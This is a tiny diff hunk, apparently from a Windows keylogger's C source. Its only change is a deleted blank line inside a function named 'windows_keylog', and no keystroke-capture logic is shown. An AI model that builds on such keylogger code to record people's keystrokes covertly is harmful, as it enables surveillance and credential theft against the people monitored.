@@ -297,7 +297,6 @@ int CheckSpecialKey(int data) {
 
 // Keylogger for Windows
 void windows_keylog(const char* filePath) {
-
     // Write the header into the file
     winWriteHeader(filePath);
 
